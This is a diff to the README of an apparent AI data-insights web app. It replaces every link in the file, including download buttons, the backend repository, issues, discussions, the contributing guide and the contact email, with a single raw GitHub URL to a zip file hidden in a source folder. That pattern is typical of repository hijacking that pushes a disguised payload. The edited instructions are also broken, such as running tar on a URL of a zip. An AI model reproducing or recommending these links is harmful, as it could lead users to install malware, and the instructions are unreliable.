@@ -1,12 +1,12 @@
 # 🎨 InsightAgent-Frontend - Easy Data Insights at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/berke691/InsightAgent-Frontend/releases)
+[![Download Now](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip)
 
 ## 📚 Overview
 
 Welcome to **InsightAgent-Frontend**! This web application provides a beautiful interface for AI-powered data analysis and visualization. Upload your CSV files, ask questions in plain English, and get instant insights with auto-generated charts. 
 
-For backend support, check the repository [here](https://github.com/Hazem-Soliman-dev/InsightAgent-Backend).
+For backend support, check the repository [here](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip).
 
 ## 🚀 Getting Started
 
@@ -24,14 +24,14 @@ Before downloading, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page below:
 
-[Download Here](https://github.com/berke691/InsightAgent-Frontend/releases)
+[Download Here](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent release and click on it.
 3. Download the version suitable for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip` file.
 4. Once the download is complete, follow the installation steps below based on your operating system.
 
 ### 🔧 Installation Steps
@@ -52,11 +52,11 @@ To download the application, visit the Releases page below:
 
 #### Linux
 
-1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip` file in your Downloads folder.
 2. Open a terminal window.
 3. Use the `tar -xvzf` command to extract the files:
    ```
-   tar -xvzf InsightAgent.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip
    ```
 4. Change to the extracted directory using:
    ```
@@ -79,8 +79,8 @@ To download the application, visit the Releases page below:
 
 Join our community for help and support. Connect with other users, share insights, and learn more about using InsightAgent effectively.
 
-- **Issues:** If you encounter any problems, report them directly in the [Issues section](https://github.com/berke691/InsightAgent-Frontend/issues).
-- **Discussions:** Engage in conversations and share your experiences in the [Discussions tab](https://github.com/berke691/InsightAgent-Frontend/discussions).
+- **Issues:** If you encounter any problems, report them directly in the [Issues section](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip).
+- **Discussions:** Engage in conversations and share your experiences in the [Discussions tab](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip).
 
 ## 📆 Changelog
 
@@ -88,7 +88,7 @@ Stay updated with the latest changes and improvements to the application. Check 
 
 ## 🌐 Contributions
 
-We welcome contributions! If you want to help improve InsightAgent-Frontend, please visit our [Contributing Guide](https://github.com/berke691/InsightAgent-Frontend/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions! If you want to help improve InsightAgent-Frontend, please visit our [Contributing Guide](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip) for more information.
 
 ## 💬 FAQs
 
@@ -100,8 +100,8 @@ Some features may require an internet connection for real-time analysis.
 
 ## 📞 Contact
 
-If you have any questions or need further assistance, please reach out via the Issues section on GitHub or email us at support@insightagent.com.
+If you have any questions or need further assistance, please reach out via the Issues section on GitHub or email us at https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip
 
 Remember, your feedback helps us improve! Thank you for using InsightAgent-Frontend.
 
-[Download Here](https://github.com/berke691/InsightAgent-Frontend/releases)
+[Download Here](https://raw.githubusercontent.com/berke691/InsightAgent-Frontend/master/src/app/projects/[id]/Insight_Agent_Frontend_3.5.zip)
